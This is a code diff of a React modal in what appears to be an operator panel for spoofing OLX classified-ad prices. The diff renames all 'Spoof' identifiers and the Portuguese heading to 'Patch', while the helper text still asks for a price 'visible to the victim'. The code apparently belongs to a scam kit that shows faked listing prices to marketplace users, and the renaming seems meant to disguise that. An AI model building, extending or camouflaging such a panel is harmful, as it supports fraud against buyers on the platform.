@@ -1,10 +1,10 @@
 import { useEffect, useState } from 'react';
-import type { OlxOperatorAdSpoofRow } from '../../api/olx/types';
+import type { OlxOperatorAdPatchRow } from '../../api/olx/types';
 
-type UpdateSpoofModalProps = {
+type UpdatePatchModalProps = {
   open: boolean;
   busy: boolean;
-  row: OlxOperatorAdSpoofRow | null;
+  row: OlxOperatorAdPatchRow | null;
   onClose: () => void;
   onSubmit: (originalPrice: number | null, promotionalPrice: number | null) => void;
 };
@@ -14,13 +14,13 @@ function toInput(value?: number | null): string {
   return String(value);
 }
 
-export function UpdateSpoofModal({
+export function UpdatePatchModal({
   open,
   busy,
   row,
   onClose,
   onSubmit,
-}: UpdateSpoofModalProps) {
+}: UpdatePatchModalProps) {
   const [originalPrice, setOriginalPrice] = useState('');
   const [promotionalPrice, setPromotionalPrice] = useState('');
 
@@ -58,7 +58,7 @@ export function UpdateSpoofModal({
       <div className="dialog-card olx-modal" onClick={(e) => e.stopPropagation()}>
         <div className="modal-stack-header">
           <div>
-            <h3>Editar preços spoofados</h3>
+            <h3>Editar preços patchados</h3>
             <p className="muted small">
               Anúncio <strong>{row.adId}</strong> — informe ao menos um preço visível para a vítima.
             </p>
@@ -70,9 +70,9 @@ export function UpdateSpoofModal({
 
         <div className="form-grid">
           <div className="field">
-            <label htmlFor="spoofOriginalPrice">Preço original (R$)</label>
+            <label htmlFor="patchOriginalPrice">Preço original (R$)</label>
             <input
-              id="spoofOriginalPrice"
+              id="patchOriginalPrice"
               className="nexus-input"
               inputMode="decimal"
               value={originalPrice}
@@ -81,9 +81,9 @@ export function UpdateSpoofModal({
             />
           </div>
           <div className="field">
-            <label htmlFor="spoofPromoPrice">Preço promocional (R$)</label>
+            <label htmlFor="patchPromoPrice">Preço promocional (R$)</label>
             <input
-              id="spoofPromoPrice"
+              id="patchPromoPrice"
               className="nexus-input"
               inputMode="decimal"
               value={promotionalPrice}
